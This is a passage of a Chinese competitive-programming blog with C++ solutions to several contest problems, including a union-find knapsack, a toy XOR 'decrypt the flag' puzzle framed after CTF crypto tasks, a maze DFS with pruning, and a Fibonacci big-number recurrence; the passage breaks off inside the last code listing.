class="line">&#123;</span><br><span class="line"><span class="keyword">int</span> q=Findset(i);</span><br><span class="line"><span class="keyword">if</span>(q!=i)</span><br><span class="line">&#123;</span><br><span class="line">dt[q][<span class="number">0</span>]+=dt[i][<span class="number">0</span>];</span><br><span class="line">dt[q][<span class="number">1</span>]+=dt[i][<span class="number">1</span>];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;++i)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">int</span> q=Findset(i);</span><br><span class="line"><span class="keyword">if</span>(q==i)</span><br><span class="line">&#123;</span><br><span class="line">dpt[++cnt][<span class="number">0</span>]=dt[i][<span class="number">0</span>];</span><br><span class="line">dpt[cnt][<span class="number">1</span>]=dt[i][<span class="number">1</span>];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=cnt;++i)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> j=w;j&gt;=dpt[i][<span class="number">0</span>];--j)</span><br><span class="line">&#123;</span><br><span class="line">dp[j]=max(dp[j],dp[j-dpt[i][<span class="number">0</span>]]+dpt[i][<span class="number">1</span>]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%lld\n"</span>,dp[w]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="解密flag"><a href="#解密flag" class="headerlink" title="解密flag"></a>解密flag</h1><h2 id="题意-5"><a href="#题意-5" class="headerlink" title="题意"></a>题意</h2><p>CTF比赛中文一般译作夺旗赛，在网络安全领域中指的是网络安全技术人员之间进行技术竞技的一种比赛形式。其大致流程是，参赛团队之间通过进行攻防对抗、程序分析等形式，率先从主办方给出的比赛环境中得到一串具有一定格式的字符串或其他内容，并将其提交给主办方，从而夺得分数。为了方便称呼，我们把这样的内容称之为“Flag”。<br>Crypto是CTF比赛中常见的一种题型，其问题大多与加密有关。这一天邓小花就遇到了一道简单的Crypto题目，题目给出了对字符串的一个加密算法和密文，要求你破解这个加密算法，并解密出Flag。该加密算法是这样的：首先读入明文字符串，随后使用下方代码中的unpack函数把明文字符串编码为长度为w的数字序列datas，随后使用encode函数对datas数组进行了加密。encode函数的参数n为数字序列的长度，iv是将给定的参数。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">unpack</span><span class="params">(<span class="keyword">char</span> * str, <span class="keyword">unsigned</span> <span class="keyword">int</span> * datas)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> len = <span class="built_in">strlen</span>(str), w = len / <span class="number">4</span>;</span><br><span class="line">    <span class="keyword">if</span> (len % <span class="number">4</span> != <span class="number">0</span>) w++;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; w; i++) &#123;</span><br><span class="line">        datas[i] = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; <span class="number">4</span>; j++) &#123;</span><br><span class="line">            datas[i] &lt;&lt;= <span class="number">8</span>;</span><br><span class="line">            datas[i] += (i * <span class="number">4</span> + j &lt; len) ? str[i * <span class="number">4</span> + j] : <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> w;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">crypto</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> x ^ (x &gt;&gt; <span class="number">16</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">encode</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> * datas, <span class="keyword">unsigned</span> <span class="keyword">int</span> iv, <span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">    datas[<span class="number">0</span>] = crypto(datas[<span class="number">0</span>] ^ iv);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; n; i++)</span><br><span class="line">        datas[i] = crypto(datas[i] ^ datas[i - <span class="number">1</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>现在给出加密后的密文数字序列，请编写解密算法解密出明文字符串。已知加密前的明文字符串仅包含数字、大小写英文字母、下划线和左右花括号（“{”和“}”）。</p><h2 id="思路-5"><a href="#思路-5" class="headerlink" title="思路"></a>思路</h2><p>a^b^a=b，剩下的不用我多说了吧</p><h2 id="代码-5"><a href="#代码-5" class="headerlink" title="代码"></a>代码</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LL unsigned long long</span></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> maxn=<span class="number">100000</span>+<span class="number">5</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> maxc=maxn*<span class="number">4</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">unsigned</span> mask=<span class="number">0xff</span>;</span><br><span class="line">LL dt[maxn];</span><br><span class="line"><span class="keyword">char</span> ret[maxc];</span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">crypto</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> x ^ (x &gt;&gt; <span class="number">16</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">LL n,iv;</span><br><span class="line"><span class="keyword">while</span>(<span class="built_in">cin</span>&gt;&gt;n&gt;&gt;iv)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;++i)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">cin</span>&gt;&gt;dt[i]; </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=n<span class="number">-1</span>;i&gt;<span class="number">0</span>;--i)</span><br><span class="line">&#123;</span><br><span class="line">dt[i]=dt[i]^(dt[i]&gt;&gt;<span class="number">16</span>);</span><br><span class="line">dt[i]=dt[i]^dt[i<span class="number">-1</span>];</span><br><span class="line">&#125;</span><br><span class="line">dt[<span class="number">0</span>]=dt[<span class="number">0</span>]^(dt[<span class="number">0</span>]&gt;&gt;<span class="number">16</span>);</span><br><span class="line">dt[<span class="number">0</span>]=dt[<span class="number">0</span>]^iv;</span><br><span class="line"><span class="keyword">int</span> di=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;++i)</span><br><span class="line">&#123;</span><br><span class="line">ret[di++]=(<span class="keyword">char</span>)((dt[i]&gt;&gt;<span class="number">24</span>)&amp;mask);</span><br><span class="line">ret[di++]=(<span class="keyword">char</span>)((dt[i]&gt;&gt;<span class="number">16</span>)&amp;mask);</span><br><span class="line">ret[di++]=(<span class="keyword">char</span>)((dt[i]&gt;&gt;<span class="number">8</span>)&amp;mask);</span><br><span class="line">ret[di++]=(<span class="keyword">char</span>)((dt[i])&amp;mask);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;ret&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="数据备份"><a href="#数据备份" class="headerlink" title="数据备份"></a>数据备份</h1><p>不会</p><h1 id="竹鼠求生"><a href="#竹鼠求生" class="headerlink" title="竹鼠求生"></a>竹鼠求生</h1><h2 id="题意-6"><a href="#题意-6" class="headerlink" title="题意"></a>题意</h2><p>有一天，一只中暑的漂亮竹鼠在养殖场内发现了一处矩形洞穴，里面有一盒藿香正气水，它毅然走了进去，准备取走这盒霍香正气水。随后，机智的它发现这是华农兄弟的陷阱，如果它取走这盒藿香正气水，洞穴的入口就会立即关闭，并在T秒后再次打开并持续很短的时间（少于1秒），之后再次合上并永远不再打开。为了带着藿香正气水离开洞穴，它必须严格地在第T秒到达洞穴入口处。洞穴内走过的地方会崩塌，洞穴内部用如下符号表示：<br>X : 无法穿越的墙<br>S : 藿香正气水所在地，也是竹鼠逃出洞穴的起点<br>D : 大门<br>.  : 无障碍平地<br>开始时间为第0秒，请你告诉竹鼠，它能否带着霍香正气水离开洞穴？ </p><h2 id="思路-6"><a href="#思路-6" class="headerlink" title="思路"></a>思路</h2><p>bfs不要太明显，然后剪枝</p><h2 id="代码-6"><a href="#代码-6" class="headerlink" title="代码"></a>代码</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cmath&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> maxn=<span class="number">50</span>+<span class="number">5</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> maxt=<span class="number">6000</span>+<span class="number">6</span>;</span><br><span class="line"><span class="keyword">int</span> n,m,t;</span><br><span class="line"><span class="keyword">char</span> mp[maxn][maxn];</span><br><span class="line"><span class="keyword">int</span> vis[maxn][maxn];</span><br><span class="line"><span class="keyword">bool</span> isflag;</span><br><span class="line"><span class="keyword">int</span> ei,ej;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dfs</span><span class="params">(<span class="keyword">int</span> i,<span class="keyword">int</span> j,<span class="keyword">int</span> t)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(n*m&lt;t)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> ;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">abs</span>(i-ei)+<span class="built_in">abs</span>(j-ej)&gt;t)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> ;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">int</span> temp=<span class="built_in">abs</span>(i-ei)+<span class="built_in">abs</span>(j-ej);</span><br><span class="line"><span class="keyword">if</span>(temp%<span class="number">2</span>!=t%<span class="number">2</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> ;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(t&lt;<span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> ;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(isflag)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> ;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(mp[i][j]==<span class="string">'D'</span>&amp;&amp;t==<span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">isflag=<span class="literal">true</span>;</span><br><span class="line"><span class="keyword">return</span> ;</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(mp[i][j]==<span class="string">'D'</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> ;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">int</span> nx,ny;</span><br><span class="line"><span class="comment">//top</span></span><br><span class="line">nx=i<span class="number">-1</span>;ny=j;</span><br><span class="line"><span class="keyword">if</span>(nx&gt;<span class="number">0</span>&amp;&amp;ny&gt;<span class="number">0</span>&amp;&amp;nx&lt;=n&amp;&amp;ny&lt;=m&amp;&amp;vis[nx][ny]==<span class="number">0</span>&amp;&amp;mp[nx][ny]!=<span class="string">'X'</span>)</span><br><span class="line">&#123;</span><br><span class="line">vis[nx][ny]=<span class="number">1</span>;</span><br><span class="line">dfs(nx,ny,t<span class="number">-1</span>);</span><br><span class="line">vis[nx][ny]=<span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//down</span></span><br><span class="line">nx=i+<span class="number">1</span>;ny=j;</span><br><span class="line"><span class="keyword">if</span>(nx&gt;<span class="number">0</span>&amp;&amp;ny&gt;<span class="number">0</span>&amp;&amp;nx&lt;=n&amp;&amp;ny&lt;=m&amp;&amp;vis[nx][ny]==<span class="number">0</span>&amp;&amp;mp[nx][ny]!=<span class="string">'X'</span>)</span><br><span class="line">&#123;</span><br><span class="line">vis[nx][ny]=<span class="number">1</span>;</span><br><span class="line">dfs(nx,ny,t<span class="number">-1</span>);</span><br><span class="line">vis[nx][ny]=<span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//left</span></span><br><span class="line">nx=i;ny=j<span class="number">-1</span>;</span><br><span class="line"><span class="keyword">if</span>(nx&gt;<span class="number">0</span>&amp;&amp;ny&gt;<span class="number">0</span>&amp;&amp;nx&lt;=n&amp;&amp;ny&lt;=m&amp;&amp;vis[nx][ny]==<span class="number">0</span>&amp;&amp;mp[nx][ny]!=<span class="string">'X'</span>)</span><br><span class="line">&#123;</span><br><span class="line">vis[nx][ny]=<span class="number">1</span>;</span><br><span class="line">dfs(nx,ny,t<span class="number">-1</span>);</span><br><span class="line">vis[nx][ny]=<span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//right</span></span><br><span class="line">nx=i;ny=j+<span class="number">1</span>;</span><br><span class="line"><span class="keyword">if</span>(nx&gt;<span class="number">0</span>&amp;&amp;ny&gt;<span class="number">0</span>&amp;&amp;nx&lt;=n&amp;&amp;ny&lt;=m&amp;&amp;vis[nx][ny]==<span class="number">0</span>&amp;&amp;mp[nx][ny]!=<span class="string">'X'</span>)</span><br><span class="line">&#123;</span><br><span class="line">vis[nx][ny]=<span class="number">1</span>;</span><br><span class="line">dfs(nx,ny,t<span class="number">-1</span>);</span><br><span class="line">vis[nx][ny]=<span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">while</span>(~<span class="built_in">scanf</span>(<span class="string">"%d%d%d"</span>,&amp;n,&amp;m,&amp;t))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">int</span> si,sj;</span><br><span class="line"><span class="keyword">if</span>(n==<span class="number">0</span>&amp;&amp;m==<span class="number">0</span>&amp;&amp;t==<span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">isflag=<span class="literal">false</span>;</span><br><span class="line"><span class="built_in">memset</span>(vis,<span class="number">0</span>,<span class="keyword">sizeof</span>(vis));</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;++i)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%s"</span>,&amp;mp[i][<span class="number">1</span>]);</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">1</span>;j&lt;=m;++j)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(mp[i][j]==<span class="string">'S'</span>)</span><br><span class="line">&#123;</span><br><span class="line">si=i;</span><br><span class="line">sj=j;</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(mp[i][j]==<span class="string">'D'</span>)</span><br><span class="line">&#123;</span><br><span class="line">ei=i;</span><br><span class="line">ej=j;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">vis[si][sj]=<span class="number">1</span>;</span><br><span class="line">dfs(si,sj,t);</span><br><span class="line"><span class="keyword">if</span>(isflag)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"YES\n"</span>);</span><br><span class="line">&#125;<span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"NO\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="喂公子吃饼"><a href="#喂公子吃饼" class="headerlink" title="喂公子吃饼"></a>喂公子吃饼</h1><h2 id="题意-7"><a href="#题意-7" class="headerlink" title="题意"></a>题意</h2><p>刑部尚书家的家丁正在喂包龙星吃饼，家丁每次可以同时喂包龙星吃一个饼或两个饼，请问喂包龙星吃N个饼一共有多少种喂法？（1&lt;=N&lt;=5000）</p><h2 id="思路-7"><a href="#思路-7" class="headerlink" title="思路"></a>思路</h2><p>爬楼梯原题，一个非常简单的大数递推。假设$f_n$表示第n时刻的方案数，那么显然$f_n=f_{n-1}+f_{n-2}$，因为他要不只能从前一刻吃一个饼或者前两刻吃两个饼，再随便来个大数模板一把梭</p><h2 id="代码-7"><a href="#代码-7" class="headerlink" title="代码"></a>代码</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span 